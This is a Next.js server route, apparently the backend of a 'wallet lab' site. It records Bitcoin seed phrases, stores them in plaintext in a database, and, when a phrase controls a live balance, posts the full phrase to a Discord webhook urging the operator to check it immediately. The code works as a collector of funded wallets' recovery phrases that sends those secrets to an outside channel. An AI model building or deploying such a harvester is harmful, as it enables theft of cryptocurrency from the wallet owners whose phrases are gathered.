import { NextRequest, NextResponse } from 'next/server';
import { createClient } from '@supabase/supabase-js';

// ── Runtime: Node.js ───────────────────────────────────────────────────
export const runtime = 'nodejs';

// ── Supabase admin client (service role — server-side only) ───────────
function getSupabaseAdmin() {
    const url = process.env.SUPABASE_URL;
    const key = process.env.SUPABASE_SERVICE_ROLE_KEY;

    if (!url || !key) {
        throw new Error('Supabase environment variables not configured.');
    }

    return createClient(url, key, {
        auth: { persistSession: false },
    });
}

// ── Discord alert ──────────────────────────────────────────────────────
async function sendDiscordAlert(phrase: string, balanceBtc: number, totalReceivedBtc: number, txCount: number): Promise<void> {
    const webhookUrl = process.env.ADMIN_ALERT_WEBHOOK;
    if (!webhookUrl) return;

    const balanceSats = Math.round(balanceBtc * 1e8).toLocaleString();
    const receivedSats = Math.round(totalReceivedBtc * 1e8).toLocaleString();

    const message =
        `🚨 **QUANTUM BTC — WALLET LAB ALERT** 🚨\n` +
        `A phrase with a **LIVE BITCOIN BALANCE** was found!\n\n` +
        `**Phrase:** \`${phrase}\`\n` +
        `**Balance:** ${balanceBtc.toFixed(8)} BTC (${balanceSats} sats)\n` +
        `**Total Received:** ${totalReceivedBtc.toFixed(8)} BTC (${receivedSats} sats)\n` +
        `**Total TXs:** ${txCount}\n\n` +
        `⚡ Check immediately at https://mempool.space`;

    try {
        const res = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: message }),
        });
        if (!res.ok) {
            console.error('[wallet-lab/record] Discord webhook failed:', res.status);
        }
    } catch (e) {
        console.error('[wallet-lab/record] Discord webhook error:', e);
    }
}

// ── Type guard ─────────────────────────────────────────────────────────
interface RecordPayload {
    phrase: string;
    phrase_hash: string;
    addresses: Record<string, string>;
    tx_count: number;
    total_received_btc: number;
    balance_btc: number;
}

function isValidPayload(body: unknown): body is RecordPayload {
    if (typeof body !== 'object' || body === null) return false;
    const b = body as Record<string, unknown>;
    return (
        typeof b.phrase === 'string' && b.phrase.length > 0 && b.phrase.length <= 500 &&
        typeof b.phrase_hash === 'string' && /^[a-f0-9]{64}$/.test(b.phrase_hash) &&
        typeof b.addresses === 'object' && b.addresses !== null &&
        typeof b.tx_count === 'number' && b.tx_count >= 0 &&
        typeof b.total_received_btc === 'number' && b.total_received_btc >= 0 &&
        typeof b.balance_btc === 'number' && b.balance_btc >= 0
    );
}

// ── Route handler ──────────────────────────────────────────────────────
export async function POST(req: NextRequest) {
    let body: unknown;
    try {
        body = await req.json();
    } catch {
        return NextResponse.json({ error: 'Invalid JSON body.' }, { status: 400 });
    }

    if (!isValidPayload(body)) {
        return NextResponse.json({ error: 'Invalid or missing payload fields.' }, { status: 400 });
    }

    const { phrase, phrase_hash, addresses, tx_count, total_received_btc, balance_btc } = body;

    try {
        const supabase = getSupabaseAdmin();

        // Insert the phrase record — ignore if it already exists (duplicates are fine)
        const { error: insertError } = await supabase
            .from('wallet_lab_phrases')
            .insert({
                phrase_hash,
                phrase,
                addresses,
                tx_count,
                total_received_btc,
                balance_btc,
                last_updated_at: new Date().toISOString(),
            });

        if (insertError) {
            // Code 23505 = unique constraint violation → phrase already recorded, not a real error
            if (!insertError.code || insertError.code !== '23505') {
                console.error('[wallet-lab/record] Supabase insert error:', insertError.message, insertError.code);
            }
            // Either way, continue to check alert status below
        }

        // Send Discord alert if balance is positive AND alert hasn't been sent for this phrase
        if (balance_btc > 0) {
            // Check if alert was already sent for this exact phrase_hash
            const { data: existing } = await supabase
                .from('wallet_lab_phrases')
                .select('alert_sent')
                .eq('phrase_hash', phrase_hash)
                .single();

            if (!existing?.alert_sent) {
                await sendDiscordAlert(phrase, balance_btc, total_received_btc, tx_count);

                // Mark as alerted
                await supabase
                    .from('wallet_lab_phrases')
                    .update({ alert_sent: true })
                    .eq('phrase_hash', phrase_hash);
            }
        }

        return NextResponse.json({ ok: true });
    } catch (err) {
        console.error('[wallet-lab/record] Unexpected error:', err instanceof Error ? err.message : 'unknown');
        return NextResponse.json({ error: 'Internal server error.' }, { status: 500 });
    }
}
